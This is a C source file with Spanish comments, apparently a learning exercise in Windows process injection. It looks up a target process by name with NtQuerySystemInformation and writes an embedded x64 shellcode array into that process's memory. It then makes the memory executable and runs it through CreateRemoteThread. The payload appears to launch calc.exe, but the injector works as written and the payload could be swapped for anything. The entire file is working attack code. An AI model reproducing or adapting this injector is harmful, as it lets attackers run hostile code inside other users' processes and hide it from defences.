#include <stdio.h>
#include <winternl.h>
#include <windows.h>

typedef NTSTATUS (NTAPI *fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

BOOL enumerarProceso(WCHAR *processName, DWORD *pidOut) {
    if (!processName || !pidOut) return FALSE;
    *pidOut = 0;
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation) GetProcAddress(
        GetModuleHandleW(L"NTDLL.DLL"), "NtQuerySystemInformation");

    if (!pNtQuerySystemInformation) {
        puts("\n[i] No se pudo obtener la direccion de memoria de NtQuerySystemInformation");
        return FALSE;
    }

    ULONG sizeDevuelto;
    printf("[i] Direccion NtQuerySystemInformation: %p", pNtQuerySystemInformation);
    // Pasamos NULL como buffer y tamaño y da error pero devuelve el tamaño del array
    pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &sizeDevuelto);

    // Alojando suficiente memoria para la structura devuelta
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T) sizeDevuelto);
    if (!SystemProcInfo) {
        puts("[X] Fallo el alojo de memoria");
        return FALSE;
    }

    ULONG sizeDevuelto2;
    NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, sizeDevuelto, &sizeDevuelto2);
    // STATUS SUCCESS
    if (status != 0X0) {
        fprintf(stderr, "[!] NtQuerySystemInformation failed: 0x%08X\n", status);
        HeapFree(GetProcessHeap(), 0, SystemProcInfo);
        return FALSE;
    }

    // Recorremos la lista
    PSYSTEM_PROCESS_INFORMATION pEntry = SystemProcInfo;
    BOOL found = FALSE;
    while (TRUE) {
        if (pEntry->ImageName.Length > 0 && pEntry->ImageName.Buffer) {
            if (_wcsicmp(processName, pEntry->ImageName.Buffer) == 0) {
                DWORD pid = (ULONG_PTR) pEntry->UniqueProcessId;
                HANDLE hProceso = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                *pidOut = pid;
                found = TRUE;
                break;
            }
        }


        if (pEntry->NextEntryOffset == 0) break;


        pEntry = (PSYSTEM_PROCESS_INFORMATION) ((PUCHAR) pEntry + pEntry->NextEntryOffset);
        /*Dirección actual: 0x1000  (pEntry)
       NextEntryOffset: 0x200   (512 bytes)
       Nuevo puntero:   0x1000 + 0x200 = 0x1200*/
    }

    HeapFree(GetProcessHeap(), 0, SystemProcInfo);
    return found;
}

BOOL inyect(HANDLE hProceso, UCHAR payload[], SIZE_T payloadSize) {
    // Alojamos memoria
    PVOID dirMemoria = VirtualAllocEx(hProceso, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dirMemoria == NULL) {
        puts("[i] No se pudo alojar memoria");
        return FALSE;
    }
    // Escribimos memoria
    if (!WriteProcessMemory(hProceso, dirMemoria, payload, payloadSize, NULL)) {
        puts("\n[i] No se pudo escribir en memoria");
        return FALSE;
    }

    memset(payload, '\0', payloadSize);
    // Cambiamos la proteccion
    DWORD oldProtect;
    if (!VirtualProtectEx(hProceso, dirMemoria, payloadSize,PAGE_EXECUTE_READWRITE, &oldProtect)) {
        puts("\n[i] Error al cambiar la proteccion de mmeoria");
        return FALSE;
    }

    // Hilo
    HANDLE hThread = CreateRemoteThread(hProceso, NULL, 0, dirMemoria, NULL, 0,NULL);
    if (hThread == NULL) {
        puts("\n[i] Error al crear el hilo");
        return FALSE;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 1) {
        puts("[i] shellinyect.exe <program>");
        wprintf(L"[i] Pulsa ENTER para salir...\n");
        getchar();
        return -1;
    }


    HANDLE hProceso = NULL;
    DWORD pid = 0;
    UCHAR payload[] = {
        0x48, 0x83, 0xe4, 0xf0, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x00, 0x02, 0x00, 0x00, 0x48, 0xb8, 0x4b, 0x45,
        0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x48, 0x89, 0x44, 0x24, 0x36, 0x66, 0xc7, 0x44, 0x24, 0x3e, 0x00, 0x00,
        0x48, 0xb8, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x89, 0x44, 0x24, 0x2d, 0xc6, 0x44, 0x24,
        0x35, 0x00, 0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x48, 0x89, 0x44, 0x24, 0x23, 0x66,
        0xc7, 0x44, 0x24, 0x2b, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40,
        0x18, 0x4c, 0x8b, 0x40, 0x20, 0x4d, 0x85, 0xc0, 0x74, 0x2b, 0x0f, 0xb6, 0x54, 0x24, 0x36, 0xeb, 0x08, 0x4d,
        0x8b, 0x00, 0x4d, 0x85, 0xc0, 0x74, 0x1c, 0x66, 0x41, 0x83, 0x78, 0x48, 0x00, 0x74, 0x0e, 0x49, 0x8b, 0x40,
        0x50, 0x38, 0x10, 0x75, 0xe8, 0x4d, 0x8b, 0x40, 0x20, 0xeb, 0x06, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x49,
        0x63, 0x40, 0x3c, 0x41, 0x8b, 0x9c, 0x00, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xc3, 0x8b, 0x43, 0x14, 0x85,
        0xc0, 0x0f, 0x84, 0x1b, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x53, 0x20, 0x44, 0x8b, 0x5b, 0x24, 0x4f, 0x8d, 0x0c,
        0x03, 0x89, 0xc0, 0x49, 0x8d, 0x34, 0x41, 0x4d, 0x29, 0xc2, 0xeb, 0x0d, 0x49, 0x83, 0xc1, 0x02, 0x49, 0x39,
        0xf1, 0x0f, 0x84, 0xec, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc8, 0x4c, 0x29, 0xd8, 0x41, 0x8b, 0x04, 0x42, 0x4c,
        0x01, 0xc0, 0x48, 0x8d, 0x48, 0x07, 0x48, 0x8d, 0x54, 0x24, 0x2d, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x66, 0x66,
        0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xb6, 0x38, 0x40, 0x38, 0x3a, 0x75, 0xc5, 0x48,
        0x83, 0xc2, 0x01, 0x48, 0x83, 0xc0, 0x01, 0x48, 0x39, 0xc8, 0x75, 0xeb, 0x41, 0x0f, 0xb7, 0x11, 0x8b, 0x43,
        0x1c, 0x49, 0x8d, 0x14, 0x90, 0x8b, 0x04, 0x02, 0x49, 0x01, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x23, 0xba, 0x00,
        0x00, 0x00, 0x00, 0x41, 0xff, 0xd0, 0x48, 0x81, 0xc4, 0x00, 0x02, 0x00, 0x00
    };


    if (enumerarProceso(argv[1], &pid)) {
        puts("\n[i] Encontrado el proceso");
        hProceso = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                               PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                               FALSE, pid);
        inyect(hProceso, payload, sizeof payload);
        puts("\n[i] Inyectado correctamente");
        CloseHandle(hProceso);
    } else {
        puts("\n[X] No se encontro el proceso");
    }
    wprintf(L"[i] FIN - pulsa ENTER para cerrar...\n");
    getchar();
    return 0;
}
